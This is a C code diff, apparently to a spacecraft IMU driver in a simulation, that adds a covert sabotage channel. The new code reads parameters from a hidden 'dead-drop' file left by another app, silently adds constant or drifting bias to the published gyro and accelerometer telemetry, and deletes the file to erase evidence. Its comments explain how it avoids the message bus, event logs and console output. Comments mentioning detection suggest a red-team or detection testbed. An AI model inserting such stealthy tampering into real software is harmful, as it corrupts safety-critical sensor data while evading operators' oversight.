@@ -384,6 +384,58 @@ void GENERIC_IMU_ReportHousekeeping(void)
 }
 
 /*
+** Covert IMU-bias channel: poll the file dead-drop written by noisy_app
+** (OPCODE_IMU_BIAS). Off-bus by design - the bus/EVS never see the cause.
+*/
+void GENERIC_IMU_PollCovertDrop(void)
+{
+    osal_id_t        fd = OS_OBJECT_ID_UNDEFINED;
+    IMU_CovertDrop_t drop;
+    int32            n;
+    os_fstat_t       statbuf;
+
+    /* Silent existence check. OS_stat returns OS_ERROR without logging on a
+     * missing file, whereas OS_OpenCreate of a missing path emits
+     * OS_DEBUG("open(...): No such file or directory") to the console every
+     * cycle - which makes this off-bus covert channel loud on the OS layer.
+     * Stat-before-open keeps the open (and its potential log line) to the one
+     * cycle the drop actually exists, while still allowing re-arming. */
+    if (OS_stat(GENERIC_IMU_DROP_PATH, &statbuf) != OS_SUCCESS)
+    {
+        return; /* no dead-drop present - leave any existing bias state intact */
+    }
+
+    if (OS_OpenCreate(&fd, GENERIC_IMU_DROP_PATH, OS_FILE_FLAG_NONE, OS_READ_ONLY) != OS_SUCCESS)
+    {
+        return; /* no dead-drop present - leave any existing bias state intact */
+    }
+
+    n = OS_read(fd, &drop, sizeof(drop));
+    OS_close(fd);
+
+    /* Validate the out-of-band contract; ignore anything that does not match. */
+    if (n != (int32)sizeof(drop) || drop.magic != GENERIC_IMU_DROP_MAGIC || drop.version != 1)
+    {
+        return;
+    }
+
+    /* Latch the spec. profile 0 = constant offset, 1 = slow drift accumulator. */
+    GENERIC_IMU_AppData.BiasAxisMask  = drop.axis_mask;
+    GENERIC_IMU_AppData.BiasProfile   = drop.profile;
+    GENERIC_IMU_AppData.BiasGyroStep  = drop.gyro_step;
+    GENERIC_IMU_AppData.BiasGyroCap   = drop.gyro_cap;
+    GENERIC_IMU_AppData.BiasAccelStep = drop.accel_step;
+    GENERIC_IMU_AppData.BiasAccelCap  = drop.accel_cap;
+    GENERIC_IMU_AppData.BiasLatched   = 1;
+
+    /* Consume (remove) the file so the evidence is transient. */
+    if (drop.flags & 0x01)
+    {
+        OS_remove(GENERIC_IMU_DROP_PATH);
+    }
+}
+
+/*
 ** Collect and Report Device Telemetry
 */
 void GENERIC_IMU_ReportDeviceTelemetry(void)
@@ -397,6 +449,74 @@ void GENERIC_IMU_ReportDeviceTelemetry(void)
                                          (GENERIC_IMU_Device_Data_tlm_t *)&GENERIC_IMU_AppData.DevicePkt.Generic_imu);
         if (status == OS_SUCCESS)
         {
+            /* Covert IMU-bias channel: latch any dead-drop, then bias the
+             * already-collected axis telemetry before it is published. The
+             * sim/42 truth is never touched, so the bus value diverges from
+             * the [IMU_TRUTH] line for detection. */
+            GENERIC_IMU_PollCovertDrop();
+            if (GENERIC_IMU_AppData.BiasLatched)
+            {
+                float *bias = &GENERIC_IMU_AppData.BiasGyro;
+
+                if (GENERIC_IMU_AppData.BiasProfile == 1)
+                {
+                    /* slow drift: accumulate per cycle up to the clamp */
+                    *bias += GENERIC_IMU_AppData.BiasGyroStep;
+                    if (*bias > GENERIC_IMU_AppData.BiasGyroCap)
+                    {
+                        *bias = GENERIC_IMU_AppData.BiasGyroCap;
+                    }
+                }
+                else
+                {
+                    /* constant offset */
+                    *bias = GENERIC_IMU_AppData.BiasGyroStep;
+                }
+
+                if (GENERIC_IMU_AppData.BiasAxisMask & 0x01)
+                {
+                    GENERIC_IMU_AppData.DevicePkt.Generic_imu.X_Data.AngularAcc += *bias;
+                }
+                if (GENERIC_IMU_AppData.BiasAxisMask & 0x02)
+                {
+                    GENERIC_IMU_AppData.DevicePkt.Generic_imu.Y_Data.AngularAcc += *bias;
+                }
+                if (GENERIC_IMU_AppData.BiasAxisMask & 0x04)
+                {
+                    GENERIC_IMU_AppData.DevicePkt.Generic_imu.Z_Data.AngularAcc += *bias;
+                }
+
+                /* Same drift profile applied to the linear-acceleration axes
+                 * (only when a nonzero accel step/cap was latched from the drop). */
+                float *abias = &GENERIC_IMU_AppData.BiasAccel;
+
+                if (GENERIC_IMU_AppData.BiasProfile == 1)
+                {
+                    *abias += GENERIC_IMU_AppData.BiasAccelStep;
+                    if (*abias > GENERIC_IMU_AppData.BiasAccelCap)
+                    {
+                        *abias = GENERIC_IMU_AppData.BiasAccelCap;
+                    }
+                }
+                else
+                {
+                    *abias = GENERIC_IMU_AppData.BiasAccelStep;
+                }
+
+                if (GENERIC_IMU_AppData.BiasAxisMask & 0x01)
+                {
+                    GENERIC_IMU_AppData.DevicePkt.Generic_imu.X_Data.LinearAcc += *abias;
+                }
+                if (GENERIC_IMU_AppData.BiasAxisMask & 0x02)
+                {
+                    GENERIC_IMU_AppData.DevicePkt.Generic_imu.Y_Data.LinearAcc += *abias;
+                }
+                if (GENERIC_IMU_AppData.BiasAxisMask & 0x04)
+                {
+                    GENERIC_IMU_AppData.DevicePkt.Generic_imu.Z_Data.LinearAcc += *abias;
+                }
+            }
+
             GENERIC_IMU_AppData.HkTelemetryPkt.DeviceCount++;
             /* Time stamp and publish data telemetry */
             CFE_SB_TimeStampMsg((CFE_MSG_Message_t *)&GENERIC_IMU_AppData.DevicePkt);
